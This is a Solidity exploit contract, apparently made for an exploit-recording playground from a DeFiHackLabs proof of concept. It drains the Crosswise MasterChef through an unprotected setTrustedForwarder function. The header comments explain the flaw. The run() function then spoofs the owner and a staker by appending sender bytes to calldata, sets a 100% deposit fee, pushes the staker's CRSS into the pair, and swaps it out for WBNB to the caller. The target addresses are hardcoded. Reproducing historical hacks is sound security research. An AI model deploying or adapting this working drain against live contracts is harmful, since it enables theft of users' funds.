// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-05-crosswise).
// The DeFiHackLabs PoC (test/crosswise_exp.sol) runs the WHOLE attack INLINE
// in the constructor of `CrosswiseTrustedForwarderAttack`
// (`new CrosswiseTrustedForwarderAttack(address(this))` from testExploit()).
// Because recordExploit.ts always deploys UNRECORDED and then records exactly
// one function call (a constructor itself can never be the recorded call),
// this is reproduced as a SYNTHETIC exploit: the constructor's body is moved
// verbatim into a callable `run()` entrypoint on `CrosswiseDrain`. Logic,
// constants, and the call sequence are copied 1:1 from
// test/crosswise_exp.sol's `CrosswiseTrustedForwarderAttack`.
//
// Root cause: Crosswise's MasterChef inherits BaseRelayRecipient (a GSN-style
// meta-tx base) whose `_msgSender()` trusts the LAST 20 BYTES of calldata as
// the real sender whenever `msg.sender == trustedForwarder`. But
// `setTrustedForwarder(address)` is `external` with NO access control — any
// caller can name itself the trusted forwarder. Once it does, it can call any
// MasterChef function with 20 bytes of arbitrary "spoofed sender" appended to
// the calldata and have `_msgSender()` believe the call came from that
// address. The attack: (1) become the trusted forwarder, (2) spoof the real
// owner to call `set(pid=0, allocPoint=0, depositFeeBP=10000, ...)`, setting
// pool 0's deposit fee to 100%, (3) spoof an address holding a large CRSS
// approval+balance (`SPOOFED_STAKER`) to call `deposit(0, stakerBalance, ...)`,
// which routes the entire 100%-fee-taxed CRSS straight into the CRSS/WBNB
// pair's balance, (4) swap that donated CRSS out of the pair for WBNB,
// pocketing the difference between the pair's constant-product price and the
// (near-zero) cost of the attack.

interface ICrssToken {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ICrosswiseMasterChef {
    function owner() external view returns (address);
    function trustedForwarder() external view returns (address);
    function devAddress() external view returns (address);
    function treasuryAddress() external view returns (address);
    function setTrustedForwarder(address trustedForwarder) external;
    function set(uint256 pid, uint256 allocPoint, uint256 depositFeeBP, address strategy, bool withUpdate) external;
    function updatePool(uint256 pid) external;
    function setDevAddress(address devAddress) external;
    function setTreasuryAddress(address treasuryAddress) external;
    function userInfo(
        uint256 pid,
        address user
    ) external view returns (uint256 amount, uint256 rewardDebt, uint256 crssRewardLockedUp, bool isVest, bool isAuto);
    function deposit(uint256 pid, uint256 amount, address referrer, bool isVest, bool isAuto) external;
}

interface ICrosswisePairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract CrosswiseDrain {
    address constant MASTER_CHEF = 0x70873211CB64c1D4EC027Ea63A399A7d07c4085B;
    address constant CRSS_TOKEN = 0x99FEFBC5cA74cc740395D65D384EDD52Cb3088Bb;
    address constant CRSS_WBNB_PAIR = 0xb5d85cA38a9CbE63156a02650884D92A6e736DDC;
    address constant SPOOFED_STAKER = 0xfD3002cE12D81c4e5F62B97F3c72f18122291A65;

    // Mirrors CrosswiseTrustedForwarderAttack's constructor body verbatim,
    // moved into a callable entrypoint so the recorder can capture it as the
    // single recorded call after an unrecorded deploy (a constructor itself
    // can never be recorded). Profit is swapped straight to `msg.sender`
    // (the attacker EOA), exactly like the original constructor forwarding
    // to `profitReceiver = address(this)` (the test contract == attacker).
    function run() external {
        ICrosswiseMasterChef masterChef = ICrosswiseMasterChef(MASTER_CHEF);
        ICrssToken crss = ICrssToken(CRSS_TOKEN);

        address realOwner = masterChef.owner();
        masterChef.setTrustedForwarder(address(this));

        _callAs(
            realOwner,
            abi.encodeWithSelector(
                ICrosswiseMasterChef.set.selector, uint256(0), uint256(0), uint256(10_000), address(0), false
            )
        );

        masterChef.updatePool(0);

        address dev = masterChef.devAddress();
        _callAs(dev, abi.encodeWithSelector(ICrosswiseMasterChef.setDevAddress.selector, dev));

        address treasury = masterChef.treasuryAddress();
        _callAs(treasury, abi.encodeWithSelector(ICrosswiseMasterChef.setTreasuryAddress.selector, treasury));

        masterChef.userInfo(0, SPOOFED_STAKER);

        uint256 stakerBalance = crss.balanceOf(SPOOFED_STAKER);
        _callAs(
            SPOOFED_STAKER,
            abi.encodeWithSelector(
                ICrosswiseMasterChef.deposit.selector, uint256(0), stakerBalance, address(0), false, false
            )
        );

        ICrosswisePairLike pair = ICrosswisePairLike(CRSS_WBNB_PAIR);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 crssInput = crss.balanceOf(CRSS_WBNB_PAIR) - uint256(reserve0);
        uint256 amountOut = _crosswiseAmountOut(crssInput, reserve0, reserve1);

        pair.swap(0, amountOut, msg.sender, "");
    }

    function _callAs(address spoofedSender, bytes memory data) private {
        (bool ok,) = MASTER_CHEF.call(bytes.concat(data, bytes20(spoofedSender)));
        require(ok, "spoofed call failed");
    }

    function _crosswiseAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 998;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }
}
